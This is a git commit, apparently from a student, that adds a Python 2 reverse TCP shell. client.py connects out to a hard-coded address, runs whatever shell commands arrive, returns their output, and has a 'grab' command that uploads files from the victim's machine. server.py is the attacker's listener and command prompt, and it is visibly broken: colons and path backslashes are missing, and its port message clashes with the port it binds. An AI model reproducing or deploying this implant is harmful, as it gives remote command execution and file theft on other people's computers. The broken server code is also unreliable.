af69a03b0a24c89b8f802ce1b0f6d55f6e373a26
Deric Mccadden <dmccadden@my.bcit.ca>
2018-10-31 18:13:09 -0700

    added reverse tcp

---
+++ client.py
@@ -0,0 +1,47 @@
+#Client
+
+import socket       #For building TCP Connection
+import subprocess   #To start he shell in the system
+import os           #For file operations
+
+def transfer(s,path):
+    if os.path.exists(path):    #Checking if the path exists in client computer
+        f=open(path,'rb')       
+        packet=f.read(1024)     #Reading 1KB from the file
+        while packet != '':   
+            s.send(packet)      #Sending 1KB to server side
+            packet=f.read(1024)
+        s.send('DONE')
+        f.close()
+        
+    else:           #If File not Found
+        s.send('Unable to find out the file')
+        
+def connect():
+
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("192.168.0.23",3000))   #Specify the IP address and Port number
+
+    while True:
+        command=s.recv(1024)      #Receiving 1Mb of data
+
+        if 'terminate' in command:
+            s.close() #Close the socket
+            break
+            
+        elif 'grab' in command:   #grab*C:\Users\file-name
+            grab,path=command.split('*')      
+            try:
+                transfer(s,path)
+            except Exception,e:
+                s.send(str(e))    #To send exception
+                pass
+            
+        else:
+            CMD=subprocess.Popen(command,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)  #Starting the subprocess
+            s.send(CMD.stdout.read())  #Send the result
+            s.send(CMD.stderr.read())  #Exception Handling
+
+def main():
+    connect()
+main()
---
+++ server.py
@@ -0,0 +1,48 @@
+#Server
+
+import socket       #For building TCP Connection
+import os	    #For file operations
+
+def transfer(conn,command)
+    
+    conn.send(command)
+    f=open('rootDesktoptestfile.png','wb')
+    while True
+        packet=conn.recv(1024)
+        if 'Unable to find out the file' in packet
+            print '[-] Unable to find out the file'
+            break
+        if packet.endswith('DONE')
+            print '[+] Transfer Completed'
+            f.close()
+            break
+        f.write(packet) 
+
+def connect()
+
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.bind(("192.168.0.23", 3000))   #Specify the IP address and Port number
+    s.listen(1)  #For listening to one connection
+    print '[+] Listening for incoming TCP connection on port 8080'
+    conn,addr=s.accept()
+    print '[+] We got a connection from ',addr
+
+    while True
+        command=raw_input(Shell ) 
+
+        if 'terminate' in command
+            conn.send('terminate')
+            conn.close() #Close the socket
+            break
+            
+        elif 'grab' in command
+            # grabCUsersfile-name.extension
+            transfer(conn,command)
+
+        else
+            conn.send(command)  #Send command
+            print conn.recv(1024)
+
+def main()
+    connect()
+main()
